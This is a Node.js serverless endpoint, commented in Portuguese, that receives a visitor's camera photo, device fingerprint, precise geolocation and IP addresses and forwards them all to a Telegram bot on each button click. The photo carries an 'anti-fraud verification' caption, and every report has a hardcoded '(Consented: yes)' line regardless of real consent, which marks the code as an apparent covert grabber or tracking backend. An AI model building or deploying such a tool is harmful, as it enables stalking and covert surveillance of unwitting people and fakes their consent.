// /api/send.js
import { Buffer } from 'node:buffer';
// Nota: Em ambientes Vercel/Node.js, o FormData e Blob podem estar disponíveis globalmente.
// Se o código abaixo falhar, considere instalar e importar 'form-data' e 'node-fetch'.

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok: false, error: 'Method not allowed' });
    return;
  }

  try {
    const body = req.body || {};
    // Captura o IP do servidor
    const serverIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      console.error('Missing TELEGRAM env vars');
      return res.status(500).json({ ok: false, error: 'telegram not configured' });
    }

    // Função auxiliar para escapar caracteres Markdown (para o texto)
    const esc = s => String(s || '').replaceAll('<', '&lt;').replaceAll('>', '&gt;');

    // ----------------------------------------------------
    // 1. TRATAMENTO E ENVIO DA FOTO (Base64 -> Buffer -> FormData)
    // ----------------------------------------------------
    let photoMessageId = null;
    let photoSent = false;
    const base64Image = body.photo;

    if (base64Image) {
      try {
        // Remove o cabeçalho Data URI: 'data:image/jpeg;base64,'
        const base64Data = base64Image.replace(/^data:image\/\w+;base64,/, "");
        
        // Cria um Buffer do Node.js a partir da string Base64 decodificada
        const photoBuffer = Buffer.from(base64Data, 'base64');
        
        // Cria um Blob para anexar ao FormData (melhor compatibilidade com fetch)
        const photoBlob = new Blob([photoBuffer], { type: 'image/jpeg' });
        
        // Cria o objeto FormData
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', '*Foto de Verificação Antifraude*');
        formData.append('parse_mode', 'Markdown');
        
        // Anexa o Blob como arquivo 'photo'
        formData.append('photo', photoBlob, 'verificacao.jpg');


        const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
          
        const photoResp = await fetch(photoUrl, {
          method: 'POST',
          // O fetch com FormData não precisa de Content-Type explícito
          body: formData,
        });
      
        const photoJ = await photoResp.json().catch(() => ({}));
      
        if (photoResp.ok) {
          photoSent = true;
          photoMessageId = photoJ.result?.message_id;
        } else {
          console.error('Telegram PHOTO error', photoResp.status, photoJ);
        }
      } catch (e) {
        console.error('Falha no processamento do Base64:', e);
      }
    }


    // ----------------------------------------------------
    // 2. MONTAGEM E ENVIO DO TEXTO COM DADOS
    // ----------------------------------------------------

    // Monta texto (Markdown)
    let text = `🔔 *Novo clique no botão*\n\n`;
    text += `📸 *Foto enviada:* ${photoSent ? 'SIM' : 'NÃO/FALHA'}\n`; // Feedback sobre a foto
    text += `\n--- DETALHES TÉCNICOS ---\n\n`;
    text += `🕒 _${new Date().toISOString()}_\n`;
    text += `🖥️ *UserAgent:* ${esc(body.userAgent)}\n`;
    text += `🌐 *Idioma:* ${esc(body.language)}\n`;
    text += `💻 *Plataforma:* ${esc(body.platform)}\n`;
    text += `📱 *Tela:* ${body.screen?.width || 'N/A'}x${body.screen?.height || 'N/A'}\n`;
    text += `🧠 *Memória (GB):* ${esc(body.deviceMemory)} • *CPU cores:* ${esc(body.hardwareConcurrency)}\n`;
    if (body.webgl?.renderer) text += `🎛️ *GPU:* ${esc(body.webgl.renderer)}\n`;
    if (body.connection) text += `📶 *Net:* ${esc(body.connection.effectiveType)} (${esc(body.connection.downlink)})\n`;
    if (body.geolocation) {
      if (body.geolocation.error) text += `📍 *Geo:* permission:${esc(body.geolocation.error)}\n`;
      else text += `📍 *Geo:* ${body.geolocation.lat.toFixed(6)}, ${body.geolocation.lon.toFixed(6)} (acc ${body.geolocation.accuracy}m)\n`;
    }
    text += `🔎 *IP público (client):* ${esc(body.publicIp)}\n`;
    text += `🔒 *IP visto no servidor:* ${esc(serverIp)}\n`;
    text += `\n(Consented: yes)`;


    // chama Telegram API para o texto (usando sendMessage)
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown'
      })
    });

    const j = await resp.json().catch(() => ({}));
    if (!resp.ok) {
      console.error('Telegram TEXT error', resp.status, j);
      return res.status(500).json({ ok: false, error: 'telegram failed', details: j });
    }

    // ----------------------------------------------------
    // 3. RETORNO FINAL
    // ----------------------------------------------------
    // Prioriza o ID da mensagem da foto, senão usa o ID da mensagem de texto
    const finalId = photoMessageId || j.result?.message_id || null;

    return res.json({ ok: true, id: finalId });

  } catch (err) {
    console.error('Global API Error:', err);
    res.status(500).json({ ok: false, error: String(err) });
  }
}
